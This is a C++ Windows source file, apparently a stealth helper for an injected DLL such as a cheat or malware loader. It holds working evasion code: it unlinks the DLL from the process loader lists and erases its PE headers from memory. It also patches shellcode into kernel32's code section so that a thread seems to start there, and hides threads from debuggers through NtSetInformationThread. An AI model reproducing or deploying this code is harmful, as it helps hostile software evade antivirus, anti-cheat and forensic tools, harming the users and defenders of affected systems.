#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <time.h>
#include <stdarg.h> 
#include <TlHelp32.h>

typedef UINT(__stdcall* threadFunction_t)(void*);

BYTE origBytes[6];
void* lpOrigAddr;

typedef struct _LDR_MODULE
{
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID BaseAddress;
	PVOID EntryPoint;
	ULONG SizeOfImage;
}
LDR_MODULE, * PLDR_MODULE;

char* Descriptografa(const char* plaintext, int x)
{
	int len = strlen(plaintext);
	char* cyphertext = new char[len + 1];
	for (int i = 0; i < len; ++i)
		cyphertext[i] = plaintext[i] - x;

	cyphertext[len] = 0;
	return cyphertext;
}

typedef struct _PEB_LDR_DATA
{
	ULONG Length;
	BOOLEAN Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
}
PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB
{
	BYTE Reserved1[2];
	BYTE BeingDebugged;
	BYTE Reserved2[1];
	PVOID Reserved3[2];
	PPEB_LDR_DATA Ldr;
}
PEB, * PPEB;

void HideModule(HMODULE hModule)
{
	PEB* peb;
	LDR_MODULE* ldr;

	peb = (PEB*)__readfsdword(0x30);

	ldr = (LDR_MODULE*)peb->Ldr->InLoadOrderModuleList.Flink;

	while (ldr->BaseAddress != 0)
	{
		if (ldr->BaseAddress == hModule)
		{
			if (ldr->InLoadOrderModuleList.Blink != 0)
				(ldr->InLoadOrderModuleList.Blink)->Flink = ldr->InLoadOrderModuleList.Flink;

			if (ldr->InLoadOrderModuleList.Blink != 0)
				(ldr->InLoadOrderModuleList.Flink)->Blink = ldr->InLoadOrderModuleList.Blink;

			if (ldr->InInitializationOrderModuleList.Blink != 0)
				(ldr->InInitializationOrderModuleList.Blink)->Flink = ldr->InInitializationOrderModuleList.Flink;

			if (ldr->InInitializationOrderModuleList.Flink != 0)
				(ldr->InInitializationOrderModuleList.Flink)->Blink = ldr->InInitializationOrderModuleList.Blink;

			if (ldr->InMemoryOrderModuleList.Flink != 0)
				(ldr->InMemoryOrderModuleList.Blink)->Flink = ldr->InMemoryOrderModuleList.Flink;

			if (ldr->InMemoryOrderModuleList.Flink != 0)
				(ldr->InMemoryOrderModuleList.Flink)->Blink = ldr->InMemoryOrderModuleList.Blink;
		}
		ldr = (LDR_MODULE*)ldr->InLoadOrderModuleList.Flink;
	}
}

/*
	Erase DLL Headers
*/
void EraseHeaders(HINSTANCE hModule)
{
	PIMAGE_DOS_HEADER pDoH;
	PIMAGE_NT_HEADERS pNtH;
	DWORD i, ersize, protect;

	if (!hModule) return;

	pDoH = (PIMAGE_DOS_HEADER)(hModule);
	pNtH = (PIMAGE_NT_HEADERS)((LONG)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);

	ersize = sizeof(IMAGE_DOS_HEADER);
	if (VirtualProtect(pDoH, ersize, PAGE_READWRITE, &protect))
	{
		for (i = 0; i < ersize; i++)
			*(BYTE*)((BYTE*)pDoH + i) = 0;
	}

	ersize = sizeof(IMAGE_NT_HEADERS);
	if (pNtH && VirtualProtect(pNtH, ersize, PAGE_READWRITE, &protect))
	{
		for (i = 0; i < ersize; i++)
			*(BYTE*)((BYTE*)pNtH + i) = 0;
	}
	return;
}

/*
	Erate PE Header
*/
void ErasePEHeader(HINSTANCE hModule)
{
	MEMORY_BASIC_INFORMATION mbi;
	VirtualQuery((LPCVOID)hModule, &mbi, sizeof(mbi));
	VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &mbi.Protect);
	ZeroMemory((PVOID)hModule, 4096);
	VirtualProtect(mbi.BaseAddress, mbi.RegionSize, mbi.Protect, NULL);
	FlushInstructionCache(GetCurrentProcess(), (LPCVOID)mbi.BaseAddress, mbi.RegionSize);
}

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	VOID* DllBase;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _UNLINKED_MODULE
{
	HMODULE hModule;
	PLIST_ENTRY RealInLoadOrderLinks;
	PLIST_ENTRY RealInMemoryOrderLinks;
	PLIST_ENTRY RealInInitializationOrderLinks;
	PLDR_DATA_TABLE_ENTRY Entry;
} UNLINKED_MODULE;

#define UNLINK(x)               \
    (x).Flink->Blink = (x).Blink;   \
    (x).Blink->Flink = (x).Flink;

#define RELINK(x, real)   \
    (x).Flink->Blink = (real);  \
    (x).Blink->Flink = (real);  \
    (real)->Blink = (x).Blink;  \
    (real)->Flink = (x).Flink;

#include <vector>
#include <algorithm>
std::vector<UNLINKED_MODULE> UnlinkedModules;

struct FindModuleHandle
{
	HMODULE m_hModule;
	FindModuleHandle(HMODULE hModule) : m_hModule(hModule)
	{
	}
	bool operator() (UNLINKED_MODULE const& Module) const
	{
		return (Module.hModule == m_hModule);
	}
};

void RelinkModuleToPEB(HMODULE hModule)
{
	std::vector<UNLINKED_MODULE>::iterator it = std::find_if(UnlinkedModules.begin(), UnlinkedModules.end(), FindModuleHandle(hModule));

	if (it == UnlinkedModules.end())
	{
		//DBGOUT(TEXT("Module Not Unlinked Yet!"));
		return;
	}

	RELINK((*it).Entry->InLoadOrderLinks, (*it).RealInLoadOrderLinks);
	RELINK((*it).Entry->InInitializationOrderLinks, (*it).RealInInitializationOrderLinks);
	RELINK((*it).Entry->InMemoryOrderLinks, (*it).RealInMemoryOrderLinks);
	UnlinkedModules.erase(it);
}

void UnlinkModuleFromPEB(HMODULE hModule)
{
	std::vector<UNLINKED_MODULE>::iterator it = std::find_if(UnlinkedModules.begin(), UnlinkedModules.end(), FindModuleHandle(hModule));
	if (it != UnlinkedModules.end())
	{
		//DBGOUT(TEXT("Module Already Unlinked!"));
		return;
	}

#ifdef _WIN64
	PPEB pPEB = (PPEB)__readgsqword(0x60);
#else
	PPEB pPEB = (PPEB)__readfsdword(0x30);
#endif

	PLIST_ENTRY CurrentEntry = pPEB->Ldr->InLoadOrderModuleList.Flink;
	PLDR_DATA_TABLE_ENTRY Current = NULL;

	while (CurrentEntry != &pPEB->Ldr->InLoadOrderModuleList && CurrentEntry != NULL)
	{
		Current = CONTAINING_RECORD(CurrentEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		if (Current->DllBase == hModule)
		{
			UNLINKED_MODULE CurrentModule = { 0 };
			CurrentModule.hModule = hModule;
			CurrentModule.RealInLoadOrderLinks = Current->InLoadOrderLinks.Blink->Flink;
			CurrentModule.RealInInitializationOrderLinks = Current->InInitializationOrderLinks.Blink->Flink;
			CurrentModule.RealInMemoryOrderLinks = Current->InMemoryOrderLinks.Blink->Flink;
			CurrentModule.Entry = Current;
			UnlinkedModules.push_back(CurrentModule);

			UNLINK(Current->InLoadOrderLinks);
			UNLINK(Current->InInitializationOrderLinks);
			UNLINK(Current->InMemoryOrderLinks);

			break;
		}

		CurrentEntry = CurrentEntry->Flink;
	}
}

/*
	Create Stealth Thread
*/


HANDLE CreateStealthThread(threadFunction_t pThreadFunc, void* pArgument) // Antigo
{
	BYTE* pK32 = (BYTE*)GetModuleHandleA("kernel32.dll");
	BYTE* pPopRet = nullptr;
	DWORD oldProt;

	auto rva2va = [&](DWORD dwVA)
	{
		return (void*)((uintptr_t)pK32 + dwVA);
	};

	void* pWriteTarget = nullptr;

	auto pMz = (IMAGE_DOS_HEADER*)pK32;
	auto pNt = (IMAGE_NT_HEADERS32*)rva2va(pMz->e_lfanew);
	auto pCurSection = (IMAGE_SECTION_HEADER*)((uintptr_t)pNt + sizeof(IMAGE_NT_HEADERS32));

	for (int i = 0; i < pNt->FileHeader.NumberOfSections; ++i)
	{
		if (memcmp(".text", pCurSection->Name, 5) == 0)
		{
			pWriteTarget = (void*)((uintptr_t)rva2va(pCurSection->VirtualAddress) + pCurSection->Misc.VirtualSize - 6);
			break;
		}
		++pCurSection;
	}

	if (!pWriteTarget) return NULL;

	UINT8 shellcode[] = "\x68\x00\x00\x00\x00\xC2";
	*(threadFunction_t*)(shellcode + 1) = pThreadFunc;

	//VirtualProtect(pWriteTarget, 6, PAGE_EXECUTE_READWRITE, &oldProt);
	//memcpy(pWriteTarget, shellcode, 6);
	//VirtualProtect(pWriteTarget, 6, oldProt, &oldProt);

	VirtualProtect(pWriteTarget, 6, PAGE_EXECUTE_READWRITE, &oldProt);
	for (int i = 0; i < 6; i++)
		origBytes[i] = *(BYTE*)((BYTE*)pWriteTarget + i);
	lpOrigAddr = pWriteTarget;
	memcpy(pWriteTarget, shellcode, 6);
	VirtualProtect(pWriteTarget, 6, oldProt, &oldProt);

	// new
	return CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)pWriteTarget, pArgument, NULL, nullptr);
}


bool HideThread(HANDLE hThread)
{
	typedef NTSTATUS(NTAPI* pNtSetInformationThread)(HANDLE, UINT, PVOID, ULONG);

	NTSTATUS Status;

	pNtSetInformationThread NtSIT = (pNtSetInformationThread)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtSetInformationThread");

	if (NtSIT == NULL)
		return false;

	if (hThread == NULL)
		Status = NtSIT(GetCurrentThread(), 0x11,
			0, 0);
	else
		Status = NtSIT(hThread, 0x11, 0, 0);

	if (Status != 0x00000000)
		return false;
	else
		return true;
}

